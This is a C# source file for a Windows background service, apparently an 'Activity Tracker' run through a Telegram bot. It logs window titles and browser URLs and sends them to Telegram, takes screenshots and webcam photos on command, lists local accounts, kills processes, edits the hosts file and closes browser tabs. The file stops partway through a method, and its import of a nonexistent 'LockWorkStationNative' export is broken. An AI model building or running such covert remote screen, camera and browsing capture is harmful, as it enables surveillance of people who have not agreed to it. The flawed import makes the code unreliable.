namespace Activity_Tracker;

using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using FlashCap;
using System.IO;
using System.Linq;

/// <summary>
/// Main background service that monitors active window changes
/// </summary>
public class Worker : BackgroundService
{
    #region Fields

    private readonly ILogger<Worker> _logger;
    private readonly TelegramBotService _telegramService;
    private readonly LocalStorageService _storageService;
    private readonly IHostApplicationLifetime _appLifetime;

    private AppSession? _currentSession;
    private readonly TimeSpan _minSessionDuration = TimeSpan.FromSeconds(15);
    private readonly TimeSpan _checkInterval = TimeSpan.FromSeconds(2); // More responsive than 10s

    private string _lastAppName = string.Empty;
    private string _lastWindowTitle = string.Empty;
    private bool _isTrackingEnabled = false; // Track whether monitoring is active
    
    private readonly TimeSpan _maxIdleTime = TimeSpan.FromMinutes(3); // Idle threshold (AFK)
    private bool _isIdle = false;
    private DateTime? _idleStartTime;

    // Performance optimization: reuse StringBuilder
    private readonly StringBuilder _windowTitleBuffer = new(256);

    private readonly HashSet<string> _blockedApps = new(StringComparer.OrdinalIgnoreCase);
    private readonly HashSet<string> _blockedDomains = new(StringComparer.OrdinalIgnoreCase);

    #endregion

    #region Windows API Imports

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    [DllImport("user32.dll")]
    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

    [DllImport("user32.dll")]
    private static extern int GetSystemMetrics(int nIndex);

    [StructLayout(LayoutKind.Sequential)]
    private struct LASTINPUTINFO
    {
        public uint cbSize;
        public uint dwTime;
    }

    [DllImport("user32.dll")]
    private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

    [DllImport("user32.dll")]
    private static extern bool LockWorkStationNative();

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    private static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);

    [DllImport("user32.dll")]
    private static extern bool SetForegroundWindow(IntPtr hWnd);

    [DllImport("user32.dll")]
    private static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);

    private const int VK_CONTROL = 0x11;
    private const int VK_W = 0x57;
    private const uint KEYEVENTF_KEYUP = 0x0002;

    [DllImport("Powrprof.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    private static extern bool SetSuspendState(bool hibernate, bool forceCritical, bool disableWakeEvent);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    private class MEMORYSTATUSEX
    {
        public uint dwLength;
        public uint dwMemoryLoad;
        public ulong ullTotalPhys;
        public ulong ullAvailPhys;
        public ulong ullTotalPageFile;
        public ulong ullAvailPageFile;
        public ulong ullTotalVirtual;
        public ulong ullAvailVirtual;
        public ulong ullAvailExtendedVirtual;
        public MEMORYSTATUSEX()
        {
            this.dwLength = (uint)Marshal.SizeOf(this);
        }
    }

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool GlobalMemoryStatusEx([In, Out] MEMORYSTATUSEX lpBuffer);

    [DllImport("kernel32.dll")]
    private static extern uint WTSGetActiveConsoleSessionId();

    #endregion

    #region Constructor

    public Worker(
        ILogger<Worker> logger,
        TelegramBotService telegramService,
        LocalStorageService storageService,
        IHostApplicationLifetime appLifetime)
    {
        _logger = logger;
        _telegramService = telegramService ?? throw new ArgumentNullException(nameof(telegramService));
        _storageService = storageService ?? throw new ArgumentNullException(nameof(storageService));
        _appLifetime = appLifetime;

        try
        {
            var loaded = _storageService.LoadBlockedApps();
            foreach (var app in loaded)
            {
                _blockedApps.Add(app);
            }

            var loadedDomains = _storageService.LoadBlockedDomains();
            foreach (var domain in loadedDomains)
            {
                _blockedDomains.Add(domain);
            }

            // Sync with system hosts file if running as admin
            ApplyHostsFileBlocking();
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "❌ Failed to load blocked apps/domains during worker startup");
        }

        _logger.LogInformation("👁️ Window Monitor Worker initialized");
        _logger.LogInformation("⏸️ Tracking is PAUSED. Send /track to start monitoring.");
    }

    #endregion

    #region Background Service Implementation

    private bool IsActiveConsoleSession()
    {
        try
        {
            uint activeSessionId = WTSGetActiveConsoleSessionId();
            if (activeSessionId == 0xFFFFFFFF)
            {
                return false;
            }

            uint currentSessionId = (uint)System.Diagnostics.Process.GetCurrentProcess().SessionId;
            return currentSessionId == activeSessionId;
        }
        catch (Exception ex)
        {
            _logger.LogWarning(ex, "Failed to determine if running in active console session");
            return true; // Fallback
        }
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        _logger.LogInformation("👁️ Window Monitor Worker starting...");

        // Initial delay to let other services start
        await Task.Delay(TimeSpan.FromSeconds(2), stoppingToken);

        _logger.LogInformation("👁️ Worker ready. Tracking is currently DISABLED.");

        // Start background periodic sync task
        _ = RunBackgroundSyncLoopAsync(stoppingToken);

        try
        {
            while (!stoppingToken.IsCancellationRequested)
            {
                if (IsActiveConsoleSession())
                {
                    // Enforce the application block list
                    EnforceAppBlockList();

                    // Enforce the website domain block list
                    EnforceWebBlockList();

                    // Only monitor if tracking is enabled
                    if (_isTrackingEnabled)
                    {
                        await MonitorWindowChangesAsync(stoppingToken);
                    }
                    else
                    {
                        // If tracking is disabled, just sleep to avoid CPU usage
                        await Task.Delay(TimeSpan.FromSeconds(5), stoppingToken);
                    }
                }
                else
                {
                    // If we became inactive but still have a session, end it gracefully
                    if (_currentSession != null)
                    {
                        _logger.LogInformation("👤 Session became inactive due to user switch. Ending current tracking session.");
                        await EndCurrentSessionAsync();
                    }

                    // Sleep longer to avoid CPU usage when backgrounded
                    await Task.Delay(TimeSpan.FromSeconds(5), stoppingToken);
                    continue; // Skip the regular check interval delay
                }

                await Task.Delay(_checkInterval, stoppingToken);
            }
        }
        catch (TaskCanceledException)
        {
            // Normal shutdown
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "❌ Error in window monitoring");
            // Don't crash the service, continue monitoring
        }

        _logger.LogInformation("👁️ Window Monitor Worker stopping...");
    }

    /// <summary>
    /// Monitors for window changes and handles session tracking
    /// </summary>
    private async Task MonitorWindowChangesAsync(CancellationToken stoppingToken)
    {
        try
        {
            // 1. Check if user is currently idle (AFK)
            if (IsUserIdle(out double idleSeconds))
            {
                if (!_isIdle)
                {
                    _isIdle = true;
                    _idleStartTime = DateTime.Now.AddSeconds(-idleSeconds);
                    _logger.LogInformation("⏸️ User is IDLE (AFK for {IdleTime}s). Pausing session tracking.", (int)idleSeconds);
                    
                    if (_currentSession != null)
                    {
                        // Backdate session end time to the exact last input moment
                        _currentSession.EndTime = _idleStartTime.Value;
                        await EndCurrentSessionAsync();
                    }
                }
                return; // Suppress window changes while user is idle
            }

            // User has returned from idle state
            if (_isIdle)
            {
                _isIdle = false;
                if (_idleStartTime.HasValue)
                {
                    var idleDuration = DateTime.Now - _idleStartTime.Value;
                    _logger.LogInformation("▶| User returned after being idle for {IdleTime}s", (int)idleDuration.TotalSeconds);
                }
                _idleStartTime = null;
            }

            var (hwnd, appName, windowTitle) = GetActiveWindowInfo();

            // Skip if we couldn't get window info
            if (string.IsNullOrEmpty(appName))
            {
                // Reset current session if window is lost
                if (_currentSession != null)
                {
                    await EndCurrentSessionAsync();
                }
                return;
            }

            // Extract active URL from browser if applicable
            string? activeUrl = BrowserUrlExtractor.GetActiveTabUrl(hwnd, appName);
            if (!string.IsNullOrEmpty(activeUrl))
            {
                try
                {
                    var uri = new Uri(activeUrl);
                    string host = uri.Host.StartsWith("www.", StringComparison.OrdinalIgnoreCase) 
                        ? uri.Host.Substring(4) 
                        : uri.Host;
                    
                    string path = uri.PathAndQuery;
                    if (path == "/") path = "";

                    string cleanUrlDisplay = host + path;
                    if (cleanUrlDisplay.Length > 40)
                    {
                        cleanUrlDisplay = cleanUrlDisplay.Substring(0, 37) + "...";
                    }

                    // Format as: "Title [domain.com/path]"
                    windowTitle = $"{windowTitle} [{cleanUrlDisplay}]";
                }
                catch
                {
                    windowTitle = $"{windowTitle} [{activeUrl}]";
                }
            }

            // Check for significant changes
            bool isNewSession = false;

            // Determine if we need to start a new session
            if (_currentSession == null)
            {
                isNewSession = true;
            }
            else if (_currentSession.AppName != appName || _currentSession.WindowTitle != windowTitle)
            {
                // App or title changed - end current session
                await EndCurrentSessionAsync();
                isNewSession = true;
            }

            // Start new session if needed
            if (isNewSession)
            {
                _currentSession = new AppSession
                {
                    AppName = appName,
                    WindowTitle = windowTitle,
                    StartTime = DateTime.Now
                };

                _logger.LogDebug(
                    "▶️ Session Started → {App} | Title: {Title}",
                    appName,
                    string.IsNullOrEmpty(windowTitle) ? "[No Title]" : Truncate(windowTitle, 50)
                );
            }

            // Update tracking variables
            _lastAppName = appName;
            _lastWindowTitle = windowTitle;

            // Update session end time (for duration calculation)
            if (_currentSession != null)
            {
                _currentSession.EndTime = DateTime.Now;
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "❌ Error in window monitoring cycle");
        }
    }

    /// <summary>
    /// Ends the current session and queues it for reporting
    /// </summary>
    private async Task EndCurrentSessionAsync()
    {
        if (_currentSession == null) return;

        try
        {
            // Set end time
            _currentSession.EndTime = DateTime.Now;
            var duration = _currentSession.Duration;

            // Format duration for logging
            string durationFormatted = DurationFormatter.Format((int)duration.TotalSeconds);

            // Check minimum duration
            if (duration >= _minSessionDuration)
            {
                _logger.LogInformation(
                    "⏹️ Session Ended → {App} | Duration: {Duration}",
                    _currentSession.AppName,
                    durationFormatted
                );

                // Create the report
                var report = ActivityReport.FromSession(_currentSession);

                // ✅ Save to local storage first (data safety)
                _storageService.Save(report);
                _logger.LogDebug("💾 Saved report to local storage: {App}", report.AppName);

                // ✅ Check internet and try to send immediately
                if (IsInternetAvailable())
                {
                    try
                    {
                        bool sent = await _telegramService.SendReportAsync(report);
                        if (sent)
                        {
                            report.Sent = true;
                            report.RecordSendAttempt(true);
                            _storageService.ArchiveReport(report); // Archive successfully sent report
                            _logger.LogDebug("✅ Report sent successfully to Telegram");
                        }
                        else
                        {
                            _logger.LogWarning("⚠️ Failed to send report to Telegram (will store locally)");
                            report.RecordSendAttempt(false, "Telegram send failed");
                            _storageService.Save(report);
                        }
                    }
                    catch (Exception ex)
                    {
                        _logger.LogError(ex, "❌ Error sending to Telegram");
                        report.RecordSendAttempt(false, ex.Message);
                        _storageService.Save(report);
                    }
                }
                else
                {
                    _logger.LogWarning("📶 Offline - Report stored locally. Will send when online.");
                }
            }
            else
            {
                _logger.LogDebug(
                    "⏩ Skipped short session → {App} | Duration: {Duration}",
                    _currentSession.AppName,
                    durationFormatted
                );
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "❌ Error ending session for {App}", _currentSession.AppName);
        }
        finally
        {
            _currentSession = null;
        }
    }

    #endregion

    #region Control Methods (for Telegram commands)

    /// <summary>
    /// Starts tracking activity
    /// </summary>
    public void StartTracking()
    {
        if (!_isTrackingEnabled)
        {
            _isTrackingEnabled = true;
            _isIdle = false;
            _idleStartTime = null;
            _logger.LogInformation("▶️ Tracking STARTED");
        }
    }

    /// <summary>
    /// Stops tracking activity
    /// </summary>
    public void StopTracking()
    {
        if (_isTrackingEnabled)
        {
            // End any active session before stopping
            if (_currentSession != null)
            {
                EndCurrentSessionAsync().Wait(TimeSpan.FromSeconds(5));
            }

            _isTrackingEnabled = false;
            _logger.LogInformation("⏸️ Tracking STOPPED");
        }
    }

    /// <summary>
    /// Gets the current active window information in a thread-safe manner
    /// </summary>
    public (string appName, string windowTitle) GetCurrentActiveWindow()
    {
        IntPtr hwnd = GetForegroundWindow();

        if (hwnd == IntPtr.Zero)
        {
            return ("None", "No active window detected");
        }

        var titleBuffer = new StringBuilder(256);
        int length = GetWindowText(hwnd, titleBuffer, titleBuffer.Capacity);
        string windowTitle = length > 0 ? titleBuffer.ToString() : "No Title";

        GetWindowThreadProcessId(hwnd, out uint pid);

        try
        {
            using var process = Process.GetProcessById((int)pid);
            string appName = GetProcessName(process);

            // Fetch live URL if it is a browser
            string? activeUrl = BrowserUrlExtractor.GetActiveTabUrl(hwnd, appName);
            if (!string.IsNullOrEmpty(activeUrl))
            {
                windowTitle = $"{windowTitle}\n• *URL:* {activeUrl}";
            }

            return (appName, windowTitle);
        }
        catch
        {
            return ("Unknown App", windowTitle);
        }
    }

    /// <summary>
    /// Captures a screenshot of the primary screen and returns it as a byte array (PNG format)
    /// </summary>
    public byte[]? CaptureScreenshot()
    {
        try
        {
            int width = GetSystemMetrics(0);  // SM_CXSCREEN
            int height = GetSystemMetrics(1); // SM_CYSCREEN

            if (width <= 0 || height <= 0)
            {
                // Fallback to standard defaults if metrics fail
                width = 1920;
                height = 1080;
            }

            using (Bitmap bitmap = new Bitmap(width, height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                }

                using (var ms = new System.IO.MemoryStream())
                {
                    bitmap.Save(ms, ImageFormat.Png);
                    return ms.ToArray();
                }
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "❌ Failed to capture screen screenshot");
            return null;
        }
    }

    /// <summary>
    /// Gets whether the user is currently detected as idle (AFK)
    /// </summary>
    public bool IsIdle => _isIdle;

    /// <summary>
    /// Gets the current tracking status
    /// </summary>
    public bool IsTrackingEnabled => _isTrackingEnabled;

    /// <summary>
    /// Gets statistics about tracked activities
    /// </summary>
    public string GetStatistics()
    {
        var stats = _storageService.GetStatistics();
        return $"📊 Activity Statistics:\n" +
               $"Total Reports: {stats.TotalCount}\n" +
               $"Pending: {stats.PendingCount}\n" +
               $"Sent: {stats.SentCount}\n" +
               $"Failed: {stats.FailedCount}\n" +
               $"Tracking: {(_isTrackingEnabled ? (_isIdle ? "IDLE (AFK) 💤" : "ON ✅") : "OFF ⏸️")}";
    }

    /// <summary>
    /// Checks if the user is currently idle based on mouse/keyboard activity.
    /// </summary>
    private bool IsUserIdle(out double idleSeconds)
    {
        idleSeconds = 0;
        
        var lii = new LASTINPUTINFO();
        lii.cbSize = (uint)Marshal.SizeOf(lii);
        
        if (GetLastInputInfo(ref lii))
        {
            uint currentTicks = (uint)Environment.TickCount;
            uint idleTicks = currentTicks - lii.dwTime;
            
            idleSeconds = idleTicks / 1000.0;
            return idleSeconds >= _maxIdleTime.TotalSeconds;
        }
        
        return false;
    }

    /// <summary>
    /// Locks the Windows workstation
    /// </summary>
    public bool LockWorkstation()
    {
        try
        {
            _logger.LogInformation("🔒 Locking workstation via remote command...");
            return LockWorkStationNative();
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "❌ Failed to lock workstation");
            return false;
        }
    }

    /// <summary>
    /// Puts the Windows workstation to sleep
    /// </summary>
    public bool SleepWorkstation()
    {
        try
        {
            _logger.LogInformation("💤 Suspending workstation via remote command...");
            return SetSuspendState(false, true, true);
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "❌ Failed to put workstation to sleep");
            return false;
        }
    }

    /// <summary>
    /// Gets current system resource specifications (RAM, Disk, Uptime)
    /// </summary>
    public (double totalRamGb, double usedRamGb, double ramPercent, double totalDiskGb, double freeDiskGb, TimeSpan uptime) GetSystemSpecs()
    {
        double totalRamGb = 0;
        double usedRamGb = 0;
        double ramPercent = 0;
        double totalDiskGb = 0;
        double freeDiskGb = 0;
        TimeSpan uptime = TimeSpan.Zero;

        try
        {
            // RAM info
            var memStatus = new MEMORYSTATUSEX();
            if (GlobalMemoryStatusEx(memStatus))
            {
                totalRamGb = memStatus.ullTotalPhys / (1024.0 * 1024.0 * 1024.0);
                usedRamGb = (memStatus.ullTotalPhys - memStatus.ullAvailPhys) / (1024.0 * 1024.0 * 1024.0);
                ramPercent = memStatus.dwMemoryLoad;
            }

            // Disk info (Primary C drive)
            var drive = new System.IO.DriveInfo("C");
            if (drive.IsReady)
            {
                totalDiskGb = drive.TotalSize / (1024.0 * 1024.0 * 1024.0);
                freeDiskGb = drive.AvailableFreeSpace / (1024.0 * 1024.0 * 1024.0);
            }

            // Uptime info
            uptime = TimeSpan.FromMilliseconds(Environment.TickCount64);
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "❌ Error retrieving system specs");
        }

        return (totalRamGb, usedRamGb, ramPercent, totalDiskGb, freeDiskGb, uptime);
    }

    /// <summary>
    /// Gets a list of local user accounts on the computer
    /// </summary>
    public List<(string name, bool isEnabled, string description)> GetLocalUsers()
    {
        var users = new List<(string name, bool isEnabled, string description)>();
        try
        {
            using (var process = new System.Diagnostics.Process())
            {
                process.StartInfo = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = "-NoProfile -Command \"Get-LocalUser | Select-Object Name, Enabled, Description | ConvertTo-Json -Compress\"",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                if (!string.IsNullOrEmpty(output))
                {
                    using (var jsonDoc = System.Text.Json.JsonDocument.Parse(output))
                    {
                        if (jsonDoc.RootElement.ValueKind == System.Text.Json.JsonValueKind.Array)
                        {
                            foreach (var element in jsonDoc.RootElement.EnumerateArray())
                            {
                                string name = element.GetProperty("Name").GetString() ?? string.Empty;
                                bool enabled = element.GetProperty("Enabled").GetBoolean();
                                string desc = element.GetProperty("Description").GetString() ?? string.Empty;
                                users.Add((name, enabled, desc));
                            }
                        }
                        else if (jsonDoc.RootElement.ValueKind == System.Text.Json.JsonValueKind.Object)
                        {
                            string name = jsonDoc.RootElement.GetProperty("Name").GetString() ?? string.Empty;
                            bool enabled = jsonDoc.RootElement.GetProperty("Enabled").GetBoolean();
                            string desc = jsonDoc.RootElement.GetProperty("Description").GetString() ?? string.Empty;
                            users.Add((name, enabled, desc));
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "❌ Failed to retrieve local users");
            users.Add((Environment.UserName, true, "Current active user account"));
        }
        return users;
    }

    /// <summary>
    /// Captures a single image from the primary webcam
    /// </summary>
    public async Task<byte[]?> CaptureWebcamImageAsync()
    {
        try
        {
            _logger.LogInformation("📸 Initiating webcam capture...");
            
            var devices = new FlashCap.CaptureDevices();
            var descriptors = devices.EnumerateDescriptors().ToList();
            
            if (descriptors.Count == 0)
            {
                _logger.LogWarning("⚠️ No webcam devices found on this system.");
                return null;
            }

            var descriptor = descriptors[0];
            _logger.LogInformation("📸 Found camera device: {Name}", descriptor.Name);

            if (descriptor.Characteristics.Length == 0)
            {
                _logger.LogWarning("⚠️ Webcam device does not expose characteristics.");
                return null;
            }

            // Prefer JPEG or PNG formats for high performance and direct compressed bytes
            var characteristic = descriptor.Characteristics.FirstOrDefault(c => 
                c.PixelFormat == FlashCap.PixelFormats.JPEG || 
                c.PixelFormat == FlashCap.PixelFormats.PNG)
                ?? descriptor.Characteristics[0];

            _logger.LogInformation("📸 Selected webcam characteristic: {Width}x{Height} ({PixelFormat})", 
                characteristic.Width, characteristic.Height, characteristic.PixelFormat);

            // Take the snapshot!
            byte[] imageData = await descriptor.TakeOneShotAsync(characteristic);
            return imageData;
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "❌ Error capturing webcam image");
            return null;
        }
    }

    /// <summary>
    /// Gets a list of the top active processes sorted by memory usage
    /// </summary>
    public List<(int pid, string name, double memoryMb)> GetTopMemoryProcesses(int count = 10)
    {
        var result = new List<(int pid, string name, double memoryMb)>();
        try
        {
            var processes = System.Diagnostics.Process.GetProcesses()
                .OrderByDescending(p => {
                    try { return p.WorkingSet64; }
                    catch { return 0L; }
                })
                .Take(count);

            foreach (var p in processes)
            {
                try
                {
                    double memMb = p.WorkingSet64 / (1024.0 * 1024.0);
                    result.Add((p.Id, p.ProcessName, memMb));
                }
                catch
                {
                    // Ignore inaccessible processes
                }
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "❌ Failed to retrieve top processes list");
        }
        return result;
    }

    /// <summary>
    /// Kills process by ID
    /// </summary>
    public bool KillProcessById(int pid, out string processName)
    {
        processName = "Unknown";
        try
        {
            var p = System.Diagnostics.Process.GetProcessById(pid);
            processName = p.ProcessName;
            p.Kill(true);
            return true;
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "❌ Failed to kill process by ID {PID}", pid);
            return false;
        }
    }

    /// <summary>
    /// Kills all processes by matching name
    /// </summary>
    public int KillProcessesByName(string name)
    {
        int killedCount = 0;
        try
        {
            var processes = System.Diagnostics.Process.GetProcessesByName(name);
            foreach (var p in processes)
            {
                try
                {
                    p.Kill(true);
                    killedCount++;
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "❌ Failed to kill matching process {Name} with PID {PID}", name, p.Id);
                }
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "❌ Failed to find matching processes for {Name}", name);
        }
        return killedCount;
    }

    /// <summary>
    /// Enforces the application block list by terminating any running instances of blocked apps
    /// </summary>
    private void EnforceAppBlockList()
    {
        if (_blockedApps.Count == 0) return;

        try
        {
            var processes = System.Diagnostics.Process.GetProcesses();
            foreach (var p in processes)
            {
                try
                {
                    if (_blockedApps.Contains(p.ProcessName))
                    {
                        _logger.LogWarning("🚫 Enforcing block list: Terminating running process {Name} (PID: {PID})", p.ProcessName, p.Id);
                        p.Kill(true);

                        _ = _telegramService.SendSystemNotificationAsync(
                            $"🚫 *App Blocked & Terminated*\n\n• *Application:* `{p.ProcessName}`\n• *PID:* `{p.Id}`\n• *Action:* Terminated immediately by policy\\."
                        );
                    }
                }
                catch
                {
                    // Ignore inaccessible processes
                }
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "❌ Error enforcing application block list");
        }
    }

    /// <summary>
    /// Gets the current list of blocked applications
    /// </summary>
    public List<string> GetBlockedApps()
    {
        lock (_blockedApps)
        {
            return _blockedApps.ToList();
        }
    }

    /// <summary>
    /// Adds an application to the block list
    /// </summary>
    public bool BlockApp(string appName)
    {
        if (string.IsNullOrWhiteSpace(appName)) return false;
        
        lock (_blockedApps)
        {
            if (_blockedApps.Add(appName))
            {
                try
                {
                    _storageService.SaveBlockedApps(_blockedApps);
                    _logger.LogInformation("🚫 Added app to block list: {AppName}", appName);
                    return true;
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "❌ Failed to save blocked apps list after adding {App}", appName);
                }
            }
        }
        return false;
    }

    /// <summary>
    /// Removes an application from the block list
    /// </summary>
    public bool UnblockApp(string appName)
    {
        if (string.IsNullOrWhiteSpace(appName)) return false;

        lock (_blockedApps)
        {
            if (_blockedApps.Remove(appName))
            {
                try
                {
                    _storageService.SaveBlockedApps(_blockedApps);
                    _logger.LogInformation("🟢 Removed app from block list: {AppName}", appName);
                    return true;
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "❌ Failed to save blocked apps list after removing {App}", appName);
                }
            }
        }
        return false;
    }

    /// <summary>
    /// Gets the current list of blocked domains
    /// </summary>
    public List<string> GetBlockedDomains()
    {
        lock (_blockedDomains)
        {
            return _blockedDomains.ToList();
        }
    }

    /// <summary>
    /// Adds a domain/website to the block list
    /// </summary>
    public bool BlockDomain(string domain)
    {
        if (string.IsNullOrWhiteSpace(domain)) return false;
        
        string cleanDomain = domain.Trim()
            .Replace("https://", "", StringComparison.OrdinalIgnoreCase)
            .Replace("http://", "", StringComparison.OrdinalIgnoreCase)
            .Replace("www.", "", StringComparison.OrdinalIgnoreCase)
            .Split('/')[0];

        lock (_blockedDomains)
        {
            if (_blockedDomains.Add(cleanDomain))
            {
                try
                {
                    _storageService.SaveBlockedDomains(_blockedDomains);
                    _logger.LogInformation("🚫 Added domain to block list: {Domain}", cleanDomain);
                    ApplyHostsFileBlocking();
                    return true;
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "❌ Failed to save blocked domains list after adding {Domain}", cleanDomain);
                }
            }
        }
        return false;
    }

    /// <summary>
    /// Removes a domain/website from the block list
    /// </summary>
    public bool UnblockDomain(string domain)
    {
        if (string.IsNullOrWhiteSpace(domain)) return false;

        string cleanDomain = domain.Trim()
            .Replace("https://", "", StringComparison.OrdinalIgnoreCase)
            .Replace("http://", "", StringComparison.OrdinalIgnoreCase)
            .Replace("www.", "", StringComparison.OrdinalIgnoreCase)
            .Split('/')[0];

        lock (_blockedDomains)
        {
            if (_blockedDomains.Remove(cleanDomain))
            {
                try
                {
                    _storageService.SaveBlockedDomains(_blockedDomains);
                    _logger.LogInformation("🟢 Removed domain from block list: {Domain}", cleanDomain);
                    ApplyHostsFileBlocking();
                    return true;
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "❌ Failed to save blocked domains list after removing {Domain}", cleanDomain);
                }
            }
        }
        return false;
    }

    /// <summary>
    /// Checks if process is running under elevated admin privileges
    /// </summary>
    public bool IsRunningAsAdmin()
    {
        try
        {
            using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent())
            {
                var principal = new System.Security.Principal.WindowsPrincipal(identity);
                return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
        }
        catch
        {
            return false;
        }
    }

    /// <summary>
    /// Appends domains to the Windows hosts file (requires Admin rights)
    /// </summary>
    private void ApplyHostsFileBlocking()
    {
        if (!IsRunningAsAdmin())
        {
            _logger.LogDebug("ℹ️ Process is not running as administrator. Skipping hosts file manipulation.");
            return;
        }

        try
        {
            string hostsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers\\etc\\hosts");
            if (!File.Exists(hostsPath)) return;

            var lines = File.ReadAllLines(hostsPath).ToList();
            var cleanLines = lines.Where(line => !line.Contains("# AT_BLOCKED")).ToList();

            if (_blockedDomains.Count > 0)
            {
                cleanLines.Add("");
                cleanLines.Add("# --- Activity Tracker Web Blocking BlockList Begin ---");
                foreach (var domain in _blockedDomains)
                {
                    cleanLines.Add($"127.0.0.1 {domain} # AT_BLOCKED");
                    if (!domain.StartsWith("www.", StringComparison.OrdinalIgnoreCase))
                    {
                        cleanLines.Add($"127.0.0.1 www.{domain} # AT_BLOCKED");
                    }
                }
                cleanLines.Add("# --- Activity Tracker Web Blocking BlockList End ---");
            }

            File.WriteAllLines(hostsPath, cleanLines);
            _logger.LogInformation("🛡️ Windows hosts file successfully updated with {Count} blocked domain(s).", _blockedDomains.Count);
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "❌ Failed to modify Windows hosts file");
        }
    }

    /// <summary>
    /// Enforces the website domain block list by checking titles and address bars
    /// </summary>
    private void EnforceWebBlockList()
    {
        if (_blockedDomains.Count == 0) return;

        try
        {
            var (hwnd, appName, windowTitle) = GetActiveWindowInfo();
            if (hwnd == IntPtr.Zero || string.IsNullOrEmpty(appName)) return;

            bool isBrowser = appName.Equals("chrome", StringComparison.OrdinalIgnoreCase) ||
                             appName.Equals("msedge", StringComparison.OrdinalIgnoreCase) ||
                             appName.Equals("firefox", StringComparison.OrdinalIgnoreCase) ||
                             appName.Equals("brave", StringComparison.OrdinalIgnoreCase) ||
                             appName.Equals("opera", StringComparison.OrdinalIgnoreCase);

            if (!isBrowser) return;

            bool isBlocked = false;
            string matchedDomain = string.Empty;

            foreach (var domain in _blockedDomains)
            {
                string keyword = domain.Replace(".com", "").Replace(".org", "").Replace(".net", "");
                if (windowTitle.Contains(domain, StringComparison.OrdinalIgnoreCase) || 
                    windowTitle.Contains(keyword, StringComparison.OrdinalIgnoreCase))
                {
                    isBlocked = true;
                    matchedDomain = domain;
                    break;
                }
            }

            if (!isBlocked)
            {
                string url = GetBrowserUrlUsingUIAutomation(hwnd, appName);
                if (!string.IsNullOrEmpty(url))
                {
                    foreach (var domain in _blockedDomains)
                    {
                        if (url.Contains(domain, StringComparison.OrdinalIgnoreCase))
                        {
                            isBlocked = true;
                            matchedDomain = domain;
                            break;
                        }
                    }
                }
            }

            if (isBlocked)
            {
                _logger.LogWarning("🚫 Enforcing website block list: Closing tab for {Domain} in browser {Browser}", matchedDomain, appName);

                SendCloseTabHotkey(hwnd);

                _ = _telegramService.SendSystemNotificationAsync(
                    $"🚫 *Website Blocked & Closed*\n\n• *Domain:* `{matchedDomain}`\n• *Browser:* `{appName}`\n• *Window Title:* `{windowTitle.Replace("`","")}`\n• *Action:* Active tab closed immediately by policy\\."
                );
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "❌ Error enforcing website block list");
        }
    }

    /// <summary>
    /// Extract browser address bar URL using UI Automation
    /// </summary>
    private string GetBrowserUrlUsingUIAutomation(IntPtr hwnd, string appName)
    {
        try
        {
            if (!appName.Equals("chrome", StringComparison.OrdinalIgnoreCase) && 
                !appName.Equals("msedge", StringComparison.OrdinalIgnoreCase))
            {
                return string.Empty;
            }

            var element = System.Windows.Automation.AutomationElement.FromHandle(hwnd);
            if (element == null) return string.Empty;

            var condition = new System.Windows.Automation.PropertyCondition(
                System.Windows.Automation.AutomationElement.ControlTypeProperty, 
                System.Windows.Automation.ControlType.Edit
            );
            
            var editElements = element.FindAll(System.Windows.Automation.TreeScope.Descendants, condition);
            foreach (System.Windows.Automation.AutomationElement edit in editElements)
            {
                if (edit.TryGetCurrentPattern(System.Windows.Automation.ValuePattern.Pattern, out object pattern))
                {
                    var valuePattern = (System.Windows.Automation.ValuePattern)pattern;
                    string value = valuePattern.Current.Value;
                    if (!string.IsNullOrEmpty(value))
                    {
                        return value;
                    }
                }
            }
        }
        catch
        {
            // Ignore UI automation errors
        }
        return string.Empty;
    }

    /// <summary>
    /// Simulates Ctrl+W to close active browser tab
    /// </summary>
    private void SendCloseTabHotkey(IntPtr hwnd)
    {
        try
        {
            SetForegroundWindow(hwnd);
